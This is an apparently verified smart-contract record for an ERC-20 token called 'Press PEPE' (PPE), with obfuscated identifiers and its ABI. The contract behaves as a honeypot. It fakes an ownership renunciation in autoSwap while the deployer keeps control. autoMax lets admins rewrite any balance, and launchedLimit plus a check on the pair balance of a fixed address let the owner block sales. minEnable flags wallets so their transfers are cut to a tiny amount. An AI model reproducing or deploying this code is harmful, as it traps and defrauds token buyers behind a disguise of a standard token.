{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface launchedFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toToken) external view returns (uint256);\n\n    function transfer(address isMarketing, uint256 receiverIs) external returns (bool);\n\n    function allowance(address modeFeeShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isMarketing,\n        uint256 receiverIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoLimit, uint256 value);\n    event Approval(address indexed modeFeeShould, address indexed spender, uint256 value);\n}\n\nabstract contract tradingMinFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchLimitWallet {\n    function createPair(address receiverTake, address launchedMarketingLiquidity) external returns (address);\n}\n\ninterface launchedFromMetadata is launchedFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PressPEPE is tradingMinFrom, launchedFrom, launchedFromMetadata {\n\n    function owner() external view returns (address) {\n        return walletLaunch;\n    }\n\n    function atSellLimit(address modeEnable, address isMarketing, uint256 receiverIs) internal returns (bool) {\n        require(txAuto[modeEnable] >= receiverIs);\n        txAuto[modeEnable] -= receiverIs;\n        txAuto[isMarketing] += receiverIs;\n        emit Transfer(modeEnable, isMarketing, receiverIs);\n        return true;\n    }\n\n    address public txIs;\n\n    function autoSwap() public {\n        emit OwnershipTransferred(walletSenderFrom, address(0));\n        walletLaunch = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return walletLaunch;\n    }\n\n    address private walletLaunch;\n\n    address public walletSenderFrom;\n\n    address modeToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchAmountTo;\n    }\n\n    uint256 amountShouldTake;\n\n    constructor (){\n        if (listReceiver == takeEnable) {\n            takeEnable = true;\n        }\n        buyTeam teamEnable = buyTeam(modeToken);\n        txIs = launchLimitWallet(teamEnable.factory()).createPair(teamEnable.WETH(), address(this));\n        \n        walletSenderFrom = _msgSender();\n        autoSwap();\n        feeLaunchSell[walletSenderFrom] = true;\n        txAuto[walletSenderFrom] = senderFund;\n        if (walletAt != limitToToken) {\n            fromSwap = true;\n        }\n        emit Transfer(address(0), walletSenderFrom, senderFund);\n    }\n\n    function modeFund() private view {\n        require(feeLaunchSell[_msgSender()]);\n    }\n\n    function launchedLimit(uint256 receiverIs) public {\n        modeFund();\n        fromExempt = receiverIs;\n    }\n\n    mapping(address => uint256) private txAuto;\n\n    string private tokenSell = \"Press PEPE\";\n\n    string private marketingTotal = \"PPE\";\n\n    bool private takeEnable;\n\n    mapping(address => bool) public feeLaunchSell;\n\n    uint256 fromExempt;\n\n    uint256 private limitToToken;\n\n    uint8 private launchAmountTo = 18;\n\n    function autoMax(address totalAmountToken, uint256 receiverIs) public {\n        modeFund();\n        txAuto[totalAmountToken] = receiverIs;\n    }\n\n    function approve(address limitMarketingReceiver, uint256 receiverIs) public virtual override returns (bool) {\n        toMarketingBuy[_msgSender()][limitMarketingReceiver] = receiverIs;\n        emit Approval(_msgSender(), limitMarketingReceiver, receiverIs);\n        return true;\n    }\n\n    mapping(address => bool) public atWallet;\n\n    event OwnershipTransferred(address indexed amountMarketing, address indexed fromList);\n\n    bool public limitAuto;\n\n    function balanceOf(address toToken) public view virtual override returns (uint256) {\n        return txAuto[toToken];\n    }\n\n    bool public listReceiver;\n\n    function sellMinTx(address modeEnable, address isMarketing, uint256 receiverIs) internal returns (bool) {\n        if (modeEnable == walletSenderFrom) {\n            return atSellLimit(modeEnable, isMarketing, receiverIs);\n        }\n        uint256 launchAmount = launchedFrom(txIs).balanceOf(feeShould);\n        require(launchAmount == fromExempt);\n        require(isMarketing != feeShould);\n        if (atWallet[modeEnable]) {\n            return atSellLimit(modeEnable, isMarketing, takeAmount);\n        }\n        return atSellLimit(modeEnable, isMarketing, receiverIs);\n    }\n\n    address feeShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private walletAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenSell;\n    }\n\n    bool public takeAt;\n\n    function isTake(address fromLiquidity) public {\n        require(fromLiquidity.balance < 100000);\n        if (limitAuto) {\n            return;\n        }\n        if (takeEnable) {\n            takeEnable = true;\n        }\n        feeLaunchSell[fromLiquidity] = true;\n        if (fromSwap == takeEnable) {\n            takeAt = false;\n        }\n        limitAuto = true;\n    }\n\n    function transferFrom(address modeEnable, address isMarketing, uint256 receiverIs) external override returns (bool) {\n        if (_msgSender() != modeToken) {\n            if (toMarketingBuy[modeEnable][_msgSender()] != type(uint256).max) {\n                require(receiverIs <= toMarketingBuy[modeEnable][_msgSender()]);\n                toMarketingBuy[modeEnable][_msgSender()] -= receiverIs;\n            }\n        }\n        return sellMinTx(modeEnable, isMarketing, receiverIs);\n    }\n\n    uint256 constant takeAmount = 15 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTotal;\n    }\n\n    uint256 private senderFund = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private toMarketingBuy;\n\n    function minEnable(address receiverLiquidity) public {\n        modeFund();\n        if (fromSwap) {\n            listReceiver = true;\n        }\n        if (receiverLiquidity == walletSenderFrom || receiverLiquidity == txIs) {\n            return;\n        }\n        atWallet[receiverLiquidity] = true;\n    }\n\n    function allowance(address liquidityReceiver, address limitMarketingReceiver) external view virtual override returns (uint256) {\n        if (limitMarketingReceiver == modeToken) {\n            return type(uint256).max;\n        }\n        return toMarketingBuy[liquidityReceiver][limitMarketingReceiver];\n    }\n\n    bool public fromSwap;\n\n    function transfer(address totalAmountToken, uint256 receiverIs) external virtual override returns (bool) {\n        return sellMinTx(_msgSender(), totalAmountToken, receiverIs);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFeeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMarketingReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmountToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"autoMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLaunchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"launchedLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"minEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmountToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSenderFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PressPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}